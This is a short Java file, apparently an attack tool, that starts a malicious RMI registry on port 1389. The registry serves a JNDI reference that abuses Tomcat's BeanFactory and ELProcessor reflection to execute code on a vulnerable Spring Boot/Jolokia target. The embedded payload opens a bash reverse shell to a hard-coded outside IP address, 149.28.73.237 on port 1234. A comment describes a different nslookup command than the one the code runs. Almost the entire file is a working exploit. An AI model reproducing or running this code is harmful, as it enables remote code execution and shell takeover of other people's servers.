package springBootJolokia;

import java.rmi.registry.*;
import com.sun.jndi.rmi.registry.*;
import javax.naming.*;
import org.apache.naming.ResourceRef;
import sun.rmi.registry.RegistryImpl;
import sun.rmi.server.UnicastServerRef;

public class EvilRMIServer {
    public static void main(String[] args) throws Exception {
        System.out.println("Creating evil RMI registry on port 1389");
        Registry registry = LocateRegistry.createRegistry( 1389);

        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
        ref.add(new StringRefAddr("forceString", "x=eval"));
        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh', '-c', 'bash -i >& /dev/tcp/149.28.73.237/1234 0>&1']).start()\")"));
        System.out.println("touch /tmp/pwd.txt");
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("Object", referenceWrapper);
        String clientHost = ((UnicastServerRef) ((RegistryImpl) ((RegistryImpl) registry)).getRef()).getClientHost();
        System.out.println("aa::" + clientHost);
    }
}
